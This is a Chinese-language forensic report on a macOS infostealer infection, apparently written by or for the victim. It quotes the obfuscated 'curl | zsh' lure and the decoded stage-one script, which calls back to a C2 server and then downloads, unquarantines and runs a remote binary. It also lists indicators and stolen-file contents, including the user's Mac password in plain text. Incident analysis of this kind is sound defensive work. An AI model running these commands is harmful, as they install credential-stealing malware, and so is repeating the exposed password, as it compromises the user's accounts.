# macOS 恶意软件感染事件 — 完整取证报告

> 事件时间：2026年6月24日 14:50 - 14:58
> 设备：MacBook Air (M5, macOS 26.5)
> 用户名：gu
> 报告生成：2026年6月24日

---

## 一、攻击命令

```
curl -s $(echo "aHR0cHM6Ly9tZWFkb3c4NC5jb20vY3VybC9jMTZiYzE4ZTBjNGY0MDYzMjIwYjMwOWJmYmQ5ZWMyZDFhMjUyZDViZDk4ODUwYjEzMmRkMzRjMmZiZWIzNzJk" | openssl base64 -d -A) | zsh
```

Base64 解码后的真实 URL：
```
https://meadow84.com/curl/c16bc18e0c4f4063220b309bfbd9ec2d1a252d5bd98850b132dd34c2fbeb372d
```

用户执行了两次该命令，两次均输入了 Mac 登录密码。

---

## 二、攻击链详细分析

### 阶段 1：初始脚本（已完全逆向）

从 meadow84.com 下载的混淆 zsh 脚本，核心 payload 为 base64+gzip 编码。解码后的实际行为：

```bash
# 1. C2 回调（✅ 确认执行成功）
curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST \
  -H 'user: mCkm8ghVZIkdzDEYt-ozbsqOwXJu6FpmveMawaVG4gE' \
  -H 'BuildID: euNoY8D635HdO8xXgc2iJKFtiD3gH0kTd88V7AOjmGY' \
  "https://pearl91.com/api/metrics/run?event=pasted"

# 2. 下载恶意二进制
curl -o /tmp/helper \
  "https://meadow84.com/2kqYRM0DCrnyJgoS4gVLl_FHJRRdTUhGCbjyuYwpZ6c/code3/update"

# 3. 移除隔离属性并执行
xattr -c /tmp/helper
chmod +x /tmp/helper
/tmp/helper
```

该脚本还包含大量混淆噪音（随机变量名、无意义的计算循环、无用的函数定义）用于逃避检测。

### 阶段 2：helper 二进制

`/tmp/helper` 信息：
- 文件类型：Mach-O universal binary (x86_64 + ARM64)
- 文件大小：~2,610,608 字节
- 分类：浏览器信息窃取器 (InfoStealer) + 文件抓取器
- 已删除（无法进一步逆向）

---

## 三、数据泄露清单（基于 out.zip 解包取证）

`/tmp/out.zip` 在删除前已完整解包分析，共 46 个文件，总计约 1.8MB：

```
out.zip/
├── Telegram Data/
│   └── D877F783D5D3EF8C/
│       ├── maps                    (324B, 会话映射)
│       └── D877F783D5D3EF8Cs       (1132B)
├── key_datas                       (388B, Telegram 密钥)
├── Chromium/
│   ├── Chrome_Default/
│   │   ├── Login Data              (61440B, 网站密码)
│   │   ├── Cookies                 (393216B, 登录会话)
│   │   └── Web Data                (196608B, 自动填充)
│   └── Edge_Default/
│       ├── Login Data              (122880B, 网站密码)
│       ├── Cookies                 (262144B, 登录会话)
│       └── Web Data                (753664B, 自动填充)
├── deskwallets/
│   ├── TonKeeper/                  (加密钱包)
│   └── Binance/                    (加密钱包)
├── FileGrabber/
│   ├── zsh_history                 (6429B, Shell历史)
│   ├── gcloud/                     (空)
│   ├── docker/                     (空)
│   ├── aws/                        (空)
│   └── filezilla/                  (空)
├── info                            (1328B, 系统信息)
├── pwd                             (11B, Mac密码: JFBG454617.)
├── masterpass-chrome               (24B, Chrome主密码)
└── username                        (2B, gu)
```

### macOS 钥匙串未被访问

- out.zip 中无钥匙串导出文件
- 恶意脚本中无 `security dump-keychain` 等钥匙串操作命令
- 攻击时段系统日志中无非授权钥匙串访问记录
- 该恶意软件为浏览器窃取器，不针对 macOS 钥匙串

---

## 四、数据是否已外传的分析

### 核心问题：out.zip 是否成功上传到攻击者服务器？

### 时间线

```
14:50:xx    第一次运行（工作目录 /tmp/39043/）
14:50-14:51  第一次扫描/打包（可能失败或被中断）
14:56:xx    第二次运行（工作目录 /tmp/30665/）
14:56:26    下载 /tmp/helper（创建时间戳）
14:56:xx    运行 helper，开始扫描浏览器数据库
14:56-14:57  系统卡死，用户观察到彩虹转圈
14:57:xx    out.zip 创建完成
14:58:xx    用户发现异常，开始排查
```

### 支持"数据未外传"的证据

| 证据 | 说明 |
|------|------|
| **系统卡死** | 用户描述窗口卡住、鼠标彩虹转圈。helper 进程很可能在扫描或打包阶段就失去响应，未能进入上传阶段 |
| **out.zip 留在 /tmp** | 如果上传成功，大多数窃取器会清理痕迹。out.zip 完整留在 /tmp 直到被手动删除 |
| **两次运行的痕迹** | /tmp/39043 和 /tmp/30665 两个工作目录说明第一次运行失败后用户又执行了第二次，上传可能一直未完成 |
| **无网络传输日志** | 系统日志中未发现 helper 进程的网络活动记录 |
| **/tmp 的进程无法通过普通 curl** | helper 运行在 /tmp 中，如果依赖 curl/wget 上传，需要额外下载依赖 |

### 支持"数据已外传"的证据

| 证据 | 说明 |
|------|------|
| **C2 回调成功** | 初始脚本的 POST 到 pearl91.com 确定已执行 |
| **上传可能在卡死前完成** | helper 可能先打包再上传，而打包中的文件 I/O 导致了界面卡顿，但上传已完成 |
| **out.zip 残留不能证明未上传** | 即使上传成功，也可能因进程崩溃而留下临时文件 |

### 综合判断

```
第一阶段（C2 回调）     → ✅ 确定成功，攻击者知道你中招了
第二阶段（文件扫描打包）→ ✅ 确定完成，out.zip 确认存在
第三阶段（数据上传）    → ❓ 不确定
```

**最可能的实际情况：攻击者收到了感染成功的通知，但不一定拿到了完整的 1.8MB out.zip。**

---

## 五、恶意域名基础设施

| 域名 | 作用 | IP 地址 | 是否屏蔽 |
|------|------|---------|:-------:|
| `meadow84.com` | 恶意脚本分发 + helper 下载 | 104.21.85.128 / 172.67.205.186 (Cloudflare) | ✅ 已屏蔽到 127.0.0.1 |
| `pearl91.com` | C2 控制服务器（回调 + 数据接收） | 104.21.93.231 / 172.67.216.134 (Cloudflare) | ✅ 已屏蔽到 127.0.0.1 |

两个域名均使用 Cloudflare CDN 隐藏真实 IP。

### 攻击者使用的 User-Agent 特征

```
user: mCkm8ghVZIkdzDEYt-ozbsqOwXJu6FpmveMawaVG4gE
BuildID: euNoY8D635HdO8xXgc2iJKFtiD3gH0kTd88V7AOjmGY
```

---

## 六、系统状态（事件后取证结果）

全盘进行了两轮 35 项检查，均未发现残留。关键结果：

| 检查项 | 结果 |
|--------|:---:|
| `/tmp` 恶意文件 | ✅ 已删除，重启后无复活 |
| 运行进程 | ✅ 全部正常 |
| LaunchAgents / LaunchDaemons (10个 plist) | ✅ 逐一内容审核，全部正常 |
| cron / at 任务 | ✅ 无 |
| 内核扩展 (kext) | ✅ 无第三方扩展 |
| 系统扩展 | ✅ 无 |
| SSH authorized_keys | ✅ 无 |
| SIP 系统完整性保护 | ✅ 已启用 |
| Gatekeeper | ✅ 已启用 |
| firewall 防火墙 | ✅ 已启用 |
| hosts 屏蔽 | ✅ `127.0.0.1 meadow84.com pearl91.com` |
| DNS 解析 | ✅ 恶意域名已指向 127.0.0.1 |
| PAM 认证模块 | ✅ 全部标准 Apple 模块 |
| /etc/sudoers | ✅ 无异常 |
| shell 配置文件 (.zshrc/.zprofile) | ✅ 信息未被篡改 |
| 环境变量 | ✅ 无异常 |
| 浏览器扩展 (Chrome 18+ / Edge 18+) | ✅ 逐一核查，全部正常 |
| 全盘 mdfind 搜索恶意文件名 | ✅ 无命中 |
| Homebrew / npm / pip 包 | ✅ 无恶意包 |

---

## 七、已执行的清理操作

| 时间 | 操作 |
|------|------|
| 14:57 | 删除 `/tmp/helper`、`/tmp/out.zip`、`/tmp/30665/`、`/tmp/39043/` |
| 14:58 | 清除 Chrome/Edge 的 Login Data、Cookies、Web Data |
| 14:58 | 清理 zsh session 记录 |
| 14:58 | 屏蔽 `meadow84.com` `pearl91.com` 到 `/etc/hosts` |
| 15:07 | 重启电脑 |
| 15:10 | 修改 Mac 登录密码 |
| 15:10-15:50 | 第一轮深度全盘扫描（25项） |
| 15:10-19:30 | 第二轮深度全盘扫描（35项） |

---

## 八、用户已采取的补救措施

- [x] 修改了 Mac 登录密码
- [x] 修改了 Apple ID / iCloud 密码
- [x] 修改了邮箱密码
- [x] 清除了 Chrome/Edge 保存的密码和 Cookie
- [x] 卸载了浏览器保存密码的功能，改用 iCloud 密码插件


---

*本报告基于以下方式进行取证：恶意脚本完整逆向解码、文件系统分析、进程分析、系统日志审计、网络连接审计、启动项审计、内核扩展审计。*
